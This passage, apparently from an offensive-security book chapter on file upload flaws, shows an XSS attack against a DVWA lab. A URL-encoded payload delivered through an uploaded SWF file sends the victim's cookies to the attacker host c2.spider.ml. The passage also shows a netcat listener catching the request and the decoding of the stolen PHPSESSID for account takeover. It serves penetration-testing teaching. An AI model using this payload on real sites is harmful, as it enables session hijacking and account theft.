setTimeout(function(){window.location.href='/';},500);</pre></div><p>The preceding JavaScript will have to be compressed to one line, separated by a semicolon, and because we have to use the URL to inject this code, we must URL encode the characters as well to ensure there are no issues in transmission. Burp's Decoder module can be used to encode and obfuscate the payload:</p><div class="mediaobject"><img src="graphics/B09238_05_13.jpg" alt="More file upload issues"/><div class="caption"><p>Figure 5.13: URL encoding the JavaScript payload using Burp's Decoder module</p></div></div><p>All characters will be converted to their hex equivalent, prepended with a percent sign (<code class="literal">%</code>), obfuscating the attack code <a id="id270" class="indexterm"/>and making sure it executes successfully on the victim's side. The URL containing the encoded payload will look like this:</p><div class="informalexample"><pre class="programlisting">http://dvwa.app.internal/hackable/uploads/xssproject.swf?js=<span class="strong"><strong>%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%22%4c%6f%61%64%69%6e%67%2e%2e%2e%3c%69%66%72%61%6d%65%20%73%74%79%6c%65%3d%27%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%27%20%73%72%63%3d%27%2f%2f%63%32%2e%73%70%69%64%65%72%2e%6d%6c%2f%22%2b%62%74%6f%61%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%2b%22%27%3e%3c%2f%69%66%72%61%6d%65%3e%22%29%3b%73%65%74%54%69%6d%65%6f%75%74%28%66%75%6e%63%74%69%6f%6e%28%29%7b%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%3d%27%2f%27%3b%7d%2c%35%30%30%29%3b</strong></span>
</pre></div><p>Once the victim follows the preceding malicious link, we should be able to see the request coming in on <code class="literal">c2.spider.ml</code> and grab the encoded cookie values from the <code class="literal">GET</code> request. To accomplish this, we can setup a listener on port <code class="literal">80</code> using the netcat (<code class="literal">nc</code>) application. Netcat is a Swiss Army knife for attackers and can do much more than just becoming a simple server, but for our purposes, this should suffice.</p><p>We can call the <code class="literal">nc</code> binary with the following switches: <code class="literal">-l</code> to initiate a listener, <code class="literal">-v</code> to display verbose information, and <code class="literal">-p</code> to specify port <code class="literal">80</code> as the listening port:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# nc -lvp 80</strong></span>
<span class="strong"><strong>listening on [any] 80 ...</strong></span>
<span class="strong"><strong>connect to [10.0.0.4] from 11.25.198.51 59197</strong></span>
</pre></div><p>With the server ready for incoming connections from our victim, we can start our attack and wait for the user to click on our malicious URL:</p><div class="informalexample"><pre class="programlisting">GET /<span class="strong"><strong>UEhQU0VTU0lEPXBhdGxrbms4bm5ndGgzcmFpNjJrYXYyc283OyBzZWN1cml0eT1oaWdo</strong></span>
HTTP/1.1
Host: c2.spider.ml
Connection: keep-alive
Upgrade-Insecure-Requests: 1
[...]</pre></div><p>The <code class="literal">GET</code> URL is a Base64-encoded value containing the exfiltrated cookie data. We can confirm this by decoding the contents using the <code class="literal">base64</code> Linux command with the <code class="literal">-d</code> switch:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# echo "UEhQU0VTU0lEPXBhdGxrbms4bm5ndGgzcmFpNjJrYXYyc283OyBzZWN1cml0eT1oaWdo" | base64 -d PHPSESSID=patlknk8nngth3rai62kav2so7; security=low</strong></span>
</pre></div><p>Success! With the <a id="id271" class="indexterm"/>session ID in hand, we can impersonate the victim and take over the account.</p><p>We can also try to upload HTML or HTM files, which could accomplish the same thing; however, these extensions are more likely to be blacklisted in applications. Developers may forget that Flash provides an API for executing JavaScript and SWF files can sometimes slip by unnoticed.</p><p>File upload can also be abused to store malicious payloads during an assessment. Application servers can be turned into simple C2 servers to evade prying blue-team eyes. It is not common for Linux/Unix-based operating systems to have antivirus software installed, and malicious Windows binaries or Meterpreter payloads can be stored on unsuspecting servers.</p></div>
<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch05lvl1sec36"/>Summary</h1></div></div></div><p>In this chapter, we looked at several methods for using an application's underlying filesystem to our advantage. We were able to get code execution using file inclusion and even attack the client using XSS vulnerabilities that we introduced ourselves.</p><p>Application development frameworks are maturing and, thankfully, some even take security seriously. As previously mentioned, there will always be a trade-off between security and usability. A file sharing site can be completely secure, but if it only allows a small number of extensions, it isn't very usable. This is a weakness that we, as attackers, can exploit for profit.</p><p>In the next chapter, we we will look at out-of-band discovery and exploitation of application vulnerabilities.</p></div></body></html>